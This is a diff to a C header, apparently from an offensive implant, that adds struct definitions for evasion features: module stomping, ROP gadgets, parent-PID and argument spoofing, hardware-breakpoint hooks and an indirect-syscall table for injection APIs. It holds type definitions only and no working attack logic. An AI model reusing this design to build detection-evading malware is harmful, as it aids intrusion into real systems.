@@ -25,6 +25,86 @@
 EXTERN_C ULONG __Instance_offset;
 EXTERN_C PVOID __Instance;
 
+typedef struct _BUFFER {
+    PVOID  Base;
+    UINT64 Length;
+} BUFFER, *PBUFFER;
+
+typedef struct _STOMP {
+    PVOID Backup;
+    USTR  ModName;
+    PVOID ModBase;
+} STOMP, *PSTOMP;
+
+typedef struct _GADGET {
+    PVOID JmpGadget;
+    PVOID RetGadget;
+    PVOID NtContinueGadget;
+} GADGET, *PGADGET;
+
+typedef struct _FORK {
+    PSTR  Spawnto;
+    DWORD Ppid;
+    BOOL  Blockdlls;
+    PWSTR Argue;            
+} FORK, *PFORK;
+
+typedef struct _HWBP {
+    PVOID            VectorHandle;
+    PVOID            DetourFunc[4];
+    CRITICAL_SECTION CriticalSection;
+    BYTE             Ret[1];
+} HWBP, *PHWBP;
+
+typedef struct SYS_TBL {
+    ULONG Ssn;
+    ULONG SysHash;
+    PVOID SysAddr;
+    PVOID SysInsAddr;
+} SYS_TBL, *PSYS_TBL;
+
+typedef struct  _SYS_API {
+    SYS_TBL NtAllocateVirtualMemory;
+    SYS_TBL NtProtectVirtualMemory;
+    SYS_TBL NtWriteVirtualMemory;
+    SYS_TBL NtOpenProcess;
+    SYS_TBL NtOpenThread;
+    SYS_TBL NtOpenThreadToken;
+    SYS_TBL NtOpenProcessToken;
+    SYS_TBL NtClose;
+    SYS_TBL NtQueryVirtualMemory;
+    SYS_TBL NtFreeVirtualMemory;
+    SYS_TBL NtCreateThreadEx;
+    SYS_TBL NtTerminateThread;
+    SYS_TBL NtTerminateProcess;
+    SYS_TBL NtSuspendThread;
+    SYS_TBL NtResumeThread;
+    SYS_TBL NtCreateFile;
+    SYS_TBL NtWriteFile;
+    SYS_TBL NtCreateSection;
+    SYS_TBL NtMapViewOfSection;
+    SYS_TBL NtUnmapViewOfSection;
+    SYS_TBL NtGetContextThread;
+    SYS_TBL NtSetContextThread;
+    SYS_TBL NtWaitForSingleObject;
+    SYS_TBL NtQueueApcThread;
+} SYS_API, *PSYS_API;
+
+typedef struct _NTDLL_CONFIG {
+    PDWORD      ArrayOfAddr;       // The VA of the array of addresses of ntdll's exported functions   [BaseAddress + IMAGE_EXPORT_DIRECTORY.AddressOfFunctions]
+    PDWORD      ArrayOfNames;      // The VA of the array of names of ntdll's exported functions       [BaseAddress + IMAGE_EXPORT_DIRECTORY.AddressOfNames]
+    PWORD       ArrayOfOrdinals;   // The VA of the array of ordinals of ntdll's exported functions    [BaseAddress + IMAGE_EXPORT_DIRECTORY.AddressOfNameOrdinals]    
+    ULONG       NumberOfNames;     // The number of exported functions from ntdll.dll                  [IMAGE_EXPORT_DIRECTORY.NumberOfNames]
+    ULONG_PTR   uModule;           // The base address of ntdll - requred to calculated future RVAs    [BaseAddress]
+}NTDLL_CONF, * PNTDLL_CONF;
+
+typedef struct _SYSC {
+    SYS_API     SysTable;
+    UINT32      wSystemCall;                  
+    PVOID       qSyscallInsAdress;
+    NTDLL_CONF  NtdllConf;
+} SYSC, *PSYSC;
+
 typedef struct _INSTANCE {
 
     PTEB Teb;
@@ -191,6 +271,7 @@ typedef struct _INSTANCE {
         GADGET Gadgets;
         FORK   Fork;
         HWBP   Hwbp;
+        SYSC   Syscall;
     } Blackout;
 
     struct {
